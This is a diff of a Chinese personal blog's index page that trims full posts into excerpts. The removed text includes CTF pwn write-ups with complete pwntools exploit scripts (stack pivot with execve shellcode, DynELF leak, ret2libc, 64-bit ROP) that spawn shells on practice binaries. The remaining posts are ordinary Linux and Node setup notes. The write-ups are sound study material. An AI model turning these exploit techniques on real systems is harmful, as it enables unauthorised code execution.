@@ -435,18 +435,18 @@
       
         
           
-            <p>stack privot 题目<br>溢出的字节就只有50-0x20-4=14个字节，所以我们很难执行一些比较好的ROP。这里我们就考虑stack privot。</p>
-<p>基本利用思路如下</p>
-<p>利用栈溢出布置shellcode<br>控制eip指向shellcode处</p>
-<p>第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启ASLR保护，所以我们很难直接知道shellcode的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对esp进行操作，使其指向shellcode处，并且直接控制程序跳转至esp处。那下面就是找控制程序跳转到esp处的gadgets了。</p>
-<p><code>ROPgadget --binary b0verfl0w --only &#39;jmp|ret&#39;</code></p>
-<p>size(shellcode+padding)=0x20<br>size(fake ebp)=0x4<br>size(0x08048504)=0x4<br>所以我们最后一段需要执行的指令就是</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">sub</span> <span class="number">0x28</span>,<span class="built_in">esp</span></div><div class="line"><span class="keyword">jmp</span> <span class="built_in">esp</span></div></pre></td></tr></table></figure>
-<p>Memory layout:<br>| Shellcode | Offset | 0x08048504 | Shellcode to perform stack pivoting | </p>
-<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">sh = process('./b0verfl0w')</div><div class="line">shellcode = "<span class="symbol">\x</span>31<span class="symbol">\x</span>c0<span class="symbol">\x</span>50<span class="symbol">\x</span>68<span class="symbol">\x</span>2f<span class="symbol">\x</span>2f<span class="symbol">\x</span>73<span class="symbol">\x</span>68<span class="symbol">\x</span>68<span class="symbol">\x</span>2f<span class="symbol">\x</span>62<span class="symbol">\x</span>69<span class="symbol">\x</span>6e<span class="symbol">\x</span>89<span class="symbol">\x</span>e3<span class="symbol">\x</span>50<span class="symbol">\x</span>53<span class="symbol">\x</span>89<span class="symbol">\x</span>e1<span class="symbol">\x</span>b0<span class="symbol">\x</span>0b<span class="symbol">\x</span>cd<span class="symbol">\x</span>80";</div><div class="line">padding = 'a'*13</div><div class="line">jmp_esp = 0x08048504</div><div class="line">sub_esp_jmp = asm('sub esp,0x28;jmp esp')</div><div class="line">payload = shellcode+padding+p32(jmp_esp)+sub_esp_jmp</div><div class="line">sh.sendline(payload)</div><div class="line">sh.interactive()</div></pre></td></tr></table></figure>
-<p>我不明白既然有了 asm(‘sub esp,0x28;jmp esp’) 为什么还需要直接跳转到esp的gadgets。<br>解释：我们就可以借由jmp esp将执行流转移到栈上执行。而转移到栈上执行后，我们还需要对esp减上偏移(在返回地址时esp已经和ebp指向同一个地址)，使之转移到我们的buf中继续执行，而buf中我们事先就输入好了shellcode，那么我们在劫持完成后便可以获得一个shell</p>
-
-          
+          stack privot 题目溢出的字节就只有50-0x20-4=14个字节，所以我们很难执行一些比较好的ROP。这里我们就考虑stack privot。
+基本利用思路如下
+利用栈溢出布置shellcode控制eip指向shellcode处
+第一步，还是比较容易地，直接读取即可，但是由于程序本身会开
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/03/18/b0verfl0w/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -608,14 +608,16 @@
       
         
           
-            <p>该题用到了 DynELF 技术  </p>
-<p>DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">p = process(<span class="string">'./xxx'</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span></span>:</div><div class="line">  <span class="comment">#各种预处理</span></div><div class="line">  payload = <span class="string">"xxxxxxxx"</span> + address + <span class="string">"xxxxxxxx"</span></div><div class="line">  p.send(payload)</div><div class="line">  <span class="comment">#各种处理</span></div><div class="line">  data = p.recv(<span class="number">4</span>)</div><div class="line">  <span class="keyword">return</span> data</div><div class="line">d = DynELF(leak, elf=ELF(<span class="string">"./xxx"</span>))      <span class="comment">#初始化DynELF模块 </span></div><div class="line">systemAddress = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)  <span class="comment">#在libc文件中搜索system函数的地址</span></div></pre></td></tr></table></figure></p>
-<p>再看read 函数：<br>定义函数：ssize_t read(int fd, void * buf, size_t count);<br>函数说明：read()会把参数fd 所指的文件传送count 个字节到buf 指针所指的内存中.  若参数count 为0, 则read()不会有作用并返回0. 返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据,此外文件读写位置会随读取到的字节移动.  </p>
-<p>思路：<br>1.调用main函数循环利用<br>2.泄露出system地址<br>3.写入”/bin/sh”<br>4.调用system获取shell，在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress。保证堆栈平衡</p>
-<p>查找gadget：<br><code>ROPgadget --binary pwn200 --only &quot;pop|ret&quot;</code><br>使用：<br><code>0x08048649 : pop esi ; pop edi ; pop ebp ; ret</code>   </p>
-<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">elf = ELF(<span class="string">'./pwn200'</span>)</div><div class="line"><span class="built_in">io</span> = process(<span class="string">'./pwn200'</span>)</div><div class="line">write_plt = elf.plt[<span class="string">'write'</span>] # symbols 也可以</div><div class="line">read_plt = elf.plt[<span class="string">'read'</span>]</div><div class="line">main_addr = <span class="number">0x80483e0</span> </div><div class="line">bss_addr = elf.bss() #用来存储<span class="string">'/bin/sh'</span></div><div class="line">pppr = <span class="number">0x08048649</span> </div><div class="line"></div><div class="line">def leak(addr):</div><div class="line">    <span class="built_in">io</span>.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</div><div class="line">    payload = <span class="string">'a'</span>*<span class="number">112</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(addr)+p32(<span class="number">4</span>)</div><div class="line">    <span class="built_in">io</span>.sendline(payload)</div><div class="line">    msg = <span class="built_in">io</span>.recv(<span class="number">4</span>)</div><div class="line">    <span class="keyword">return</span> msg</div><div class="line"></div><div class="line">dyn = DynELF(leak,elf=elf)  </div><div class="line">sys_addr = dyn.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</div><div class="line">payload = <span class="string">'a'</span>*<span class="number">112</span>+p32(read_plt)+p32(pppr)+p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">8</span>)+p32(sys_addr)+p32(main_addr)+p32(bss_addr)</div><div class="line"><span class="built_in">io</span>.sendline(payload)</div><div class="line"><span class="built_in">io</span>.sendline(<span class="string">'/bin/sh\0'</span>)</div><div class="line"><span class="built_in">io</span>.interactive()</div></pre></td></tr></table></figure>
-
-          
+          该题用到了 DynELF 技术  
+DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。12345678910p = process('./xxx')def leak(address):  #各种预处理  payload = "xxxxxxxx" + add
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/03/18/XDCTF2015-pwn200/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -777,11 +779,15 @@
       
         
           
-            <p>分析：<br>buf大小只有0x88,但是却允许被读入0x100的字节大小，造成缓冲区溢出。程序是32位。<br>定义函数：ssize_t write (int fd, const void * buf, size_t count);<br>函数说明：write()会把参数buf 所指的内存写入count 个字节到参数fd 所指的文件内. 当然, 文件读写位置也会随之移动.  </p>
-<p>攻击思路：<br>1.构造 payload leak 内存中的一个函数地址，比如 read ，write（返回地址是有漏洞的函数，以便第二次利用）<br>2.计算libc base，得到 system 地址<br>3.构造payload get shell</p>
-<p>info leak:<br>payload：<br><code>&#39;A&#39; * N + p32(write_plt) + p32(ret) + p32(1) + p32(address) + p32(4)</code><br>输入N个字符后发生溢出，write_plt的地址将会覆盖 read 函数的返回地址，随后程序将会跳转到write函数，我们在栈中构造了write函数的3个参数和返回地址，这段payload相当于让程序执行<br><code>write(1, address, 4)</code>;<br>这样就可以dump出内存中地址为address处的4字节数据。 (参考：<a href="http://blog.csdn.net/smalosnail/article/details/53386353" target="_blank" rel="external">初探ROP攻击 Memory Leak &amp; DynELF</a>)<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">from</span> pwn import *</div><div class="line">elf = ELF(<span class="string">'./ropasaurusrex'</span>)</div><div class="line">io = <span class="built_in">process</span>(<span class="string">'./ropasaurusrex'</span>)</div><div class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>) <span class="comment">#原本写的 ./libc.so.6 出错了</span></div><div class="line">buf_len = <span class="number">0x88</span>  </div><div class="line">vun_fun = <span class="number">0x80483F4</span>   <span class="comment">#存在漏洞函数的地址</span></div><div class="line">read_offset = libc.symbols[<span class="string">'read'</span>]</div><div class="line"><span class="comment">#leak info </span></div><div class="line">payload = <span class="string">'a'</span>*<span class="number">140</span>+p32(elf.symbols[<span class="string">'write'</span>])+p32(vun_fun)+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">'read'</span>])+p32(<span class="number">4</span>)</div><div class="line">io.<span class="built_in">send</span>(payload)</div><div class="line">msg = io.recv(<span class="number">4</span>)</div><div class="line">read_addr = u32(msg)</div><div class="line"></div><div class="line"><span class="comment">#get shell</span></div><div class="line">libc_base = read_addr-read_offset</div><div class="line">sys_addr = libc_base+libc.symbols[<span class="string">'system'</span>]</div><div class="line">bin_addr = libc_base+next(libc.search(<span class="string">'/bin/sh'</span>))</div><div class="line">payload = <span class="string">'a'</span>*<span class="number">140</span>+p32(sys_addr)+p32(<span class="number">0xdeafbeef</span>)+p32(bin_addr)</div><div class="line"></div><div class="line">io.<span class="built_in">send</span>(payload)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure></p>
-
-          
+          分析：buf大小只有0x88,但是却允许被读入0x100的字节大小，造成缓冲区溢出。程序是32位。定义函数：ssize_t write (int fd, const void * buf, size_t count);函数说明：write()会把参数buf 所指的内存写入count 个字节到参数fd
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/03/17/PlaidCTF-2013-ropasaurusrex/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -943,12 +949,16 @@
       
         
           
-            <p>64位需要rdi传参，有PIE保护不能使用程序中的gadget，此处可以从libc中找   </p>
-<p>buf的大小是8，会造成缓冲区溢出<br>解题思路<br>1.找到一个gadget RDI<br>2.找到 <code>/bin/sh</code>地址<br>3.找到 <code>system</code> 函数地址<br>查找 gadget<br><code>ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;pop|ret&quot;</code><br>查找 /bin/sh 字符串<br><code>strings -a -tx /lib/x86_64-linux-gnu/libc.so.6 | grep &quot;/bin/sh&quot;</code></p>
-<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">elf = ELF(<span class="string">'r0pbaby'</span>)</div><div class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class="line"><span class="built_in">io</span> = process(<span class="string">'./r0pbaby'</span>)</div><div class="line">sh = <span class="built_in">next</span>(libc.search(<span class="string">'/bin/sh'</span>))</div><div class="line">sys_offset = libc.symbols[<span class="string">'system'</span>]</div><div class="line">rdi_offset = <span class="number">0x000000000002144f</span></div><div class="line"></div><div class="line">def getFun(fun):</div><div class="line">    <span class="built_in">io</span>.recvuntil(<span class="string">"4) Exit\n:"</span>)</div><div class="line">    <span class="built_in">io</span>.sendline(<span class="string">'2'</span>)</div><div class="line">    <span class="built_in">io</span>.recvuntil(<span class="string">"Enter symbol:"</span>)</div><div class="line">    <span class="built_in">io</span>.sendline(fun)</div><div class="line">    msg = <span class="built_in">io</span>.recvuntil(<span class="string">"4) Exit\n: "</span>)</div><div class="line">    offset = msg.find(<span class="string">":"</span>)</div><div class="line">    offset2 = msg.find(<span class="string">"\n"</span>)</div><div class="line">    addr = msg[offset+<span class="number">2</span>:offset2]</div><div class="line">    <span class="keyword">return</span> long(addr,<span class="number">16</span>)</div><div class="line"></div><div class="line">sys_addr = getFun(<span class="string">'system'</span>) </div><div class="line">sh_addr = sys_addr-sys_offset + sh </div><div class="line">rdi_addr = sys_addr - sys_offset+rdi_offset</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span>*<span class="number">8</span>+p64(rdi_addr)+p64(sh_addr)+p64(sys_addr)</div><div class="line"><span class="built_in">io</span>.recv()</div><div class="line"><span class="built_in">io</span>.sendline(<span class="string">'3'</span>)</div><div class="line"><span class="built_in">io</span>.recv()</div><div class="line"><span class="built_in">io</span>.sendline(str(len(payload)))</div><div class="line"><span class="built_in">io</span>.sendline(payload)</div><div class="line"><span class="built_in">io</span>.recvuntil(<span class="string">"Bad choice.\n"</span>)   </div><div class="line"><span class="built_in">io</span>.interactive()</div></pre></td></tr></table></figure>
-<p>总结：简单的调用 system + “bin/sh” 通过寄存器 gadget “pop rdi;ret “传参</p>
-
-          
+          64位需要rdi传参，有PIE保护不能使用程序中的gadget，此处可以从libc中找   
+buf的大小是8，会造成缓冲区溢出解题思路1.找到一个gadget RDI2.找到 /bin/sh地址3.找到 system 函数地址查找 gadgetROPgadget --binary /lib/x86
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/03/17/Defcon-2015-Qualifier-r0pbaby/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1284,14 +1294,20 @@
       
         
           
-            <a id="more"></a> 
-<p>1.去官网找到对应的msi文件  </p>
-<p><img src="http://otswdapxf.bkt.clouddn.com/%E9%80%89%E6%8B%A9msi.jpg?imageView2/0/w/600" alt=""></p>
-<p>2.下载，安装到node历史安装目录<br>3.查看是否升级成功，完毕 </p>
-<p><img src="http://otswdapxf.bkt.clouddn.com/node%E5%8D%87%E7%BA%A7%E5%AE%8C%E6%88%90.jpg?imageView2/0/w/200" alt=""></p>
-<p>尝试过通过 n 来安装node最新版，但是 n 一直不能安装成功，也尝试过用 cnpm 安装 n ，出现了自己无法解决的问题。最终还是去官网下载 msi 文件<br>另外遇到安装是窗口在屏幕外一直无法拖动的情况，右键选择移动（M键）后使用键盘的上下左右移动后回车就好了 &gt;&lt;  </p>
+           
+1.去官网找到对应的msi文件  
 
-          
+2.下载，安装到node历史安装目录3.查看是否升级成功，完毕 
+
+尝试过通过 n 来安装node最新版，但是 n 一直不能安装成功，也尝试过用 cnpm 安装 n ，出现了自己无法解决的问题。最终还是去官网下载 msi 文件另外遇到安装是窗口在屏幕外一直无
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/09/02/windows10 下升级 node/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1633,9 +1649,15 @@
       
         
           
-            <p>F2 创建新的窗口<br>shift+F2生成水平分隔<br>ctrl+F2生成垂直分隔<br>ctrl+shift+F2生成新会话<br>F3 回到先前窗口<br>F4:跳到下一个窗口<br>shift+F3在一个窗口的分隔中回到上一个子窗口，可循环<br>shift+F4在一个窗口的分隔中回到下一个子窗口，可循环<br>F5 重新加载文件<br>F6 释放该次对话并退出Byobu环境，回到当前终端窗口<br>F7 进入 复制/回滚模式<br>F8 重新命名一个窗口<br>F9 启动配置窗口  </p>
-
-          
+          F2 创建新的窗口shift+F2生成水平分隔ctrl+F2生成垂直分隔ctrl+shift+F2生成新会话F3 回到先前窗口F4:跳到下一个窗口shift+F3在一个窗口的分隔中回到上一个子窗口，可循环shift+F4在一个窗口的分隔中回到下一个子窗口，可循环F5 重新加载文件F6 释放该次对话并
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/07/30/byobu/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1803,16 +1825,19 @@
       
         
           
-            <a id="more"></a>  
-<p>将下载源加入系统的源列表：<br><code>sudo wget http://www.linuxidc.com/files/repo/google-chrome.list -P /etc/apt/sources.list.d/</code><br>如果地址失效可以搜索其他下载源  </p>
-<p><img src="http://otswdapxf.bkt.clouddn.com/chrome1.jpg?imageView/2/w/500" alt=""></p>
-<p>导入谷歌的公匙:  </p>
-<p><code>wget -q -O - https://dl.google.com/linux/linux_signing_key.pub  | sudo apt-key add -</code></p>
-<p><img src="http://otswdapxf.bkt.clouddn.com/chrome2.jpg?imageView/2/w/500" alt=""></p>
-<p>更新列表：<br><code>sudo apt-get update</code></p>
-<p>安装：<br><code>sudo apt-get install google-chrome-stable</code></p>
+            
+将下载源加入系统的源列表：sudo wget http://www.linuxidc.com/files/repo/google-chrome.list -P /etc/apt/sources.list.d/如果地址失效可以搜索其他下载源  
 
-          
+导入谷歌的公匙:  
+wget -q -O - 
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/07/29/ubuntu16.04 安装chrome/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1980,17 +2005,19 @@
       
         
           
-            <a id="more"></a>
-<p><a href="https://github.com/horst3180/arc-theme" target="_blank" rel="external">Arc</a>  </p>
-<p>安装gnome-tweak-tool:<br><code>sudo apt install gnome-tweak-tool</code></p>
-<p>安装GTK3：<br><code>sudo apt-get install build-essential</code>(如果还没有)<br><code>sudo apt-get install libgtk-3-dev</code>   </p>
-<p>获取主题并编译安装：<br><code>git clone https://github.com/horst3180/arc-theme --depth 1 &amp;&amp; cd arc-theme</code><br><code>sudo apt-get install dh-autoreconf</code><br><code>sudo make install</code></p>
-<p>打开gnome-tweak-tool：<br><code>gnome-tweak-tool</code>  </p>
-<p>设置主题样式为ARC:<br><img src="http://otswdapxf.bkt.clouddn.com/set-theme.jpg?imageView/2/w/500" alt=""></p>
-<p>但是…没有实现透明…</p>
-<p>具体设置可看主题链接  </p>
-
           
+Arc  
+安装gnome-tweak-tool:sudo apt install gnome-tweak-tool
+安装GTK3：sudo apt-get install build-essential(如果还没有)sudo apt-get install libgtk-3-dev   
+获取主
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/07/29/gonme安装GTK主题ARC(ubuntu16-04)/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -2353,6 +2380,31 @@
 
 
 
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  
+  
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'VeQJNmfPOV9K2WFrArLoD0xN-gzGzoHsz',
+        appKey: 'TfDg8GxclLQKiTCGQ0hkV63P',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        meta:guest,
+        pageSize:'10' || 10,
+        visitor: false
+    });
+  </script>
 
 
 
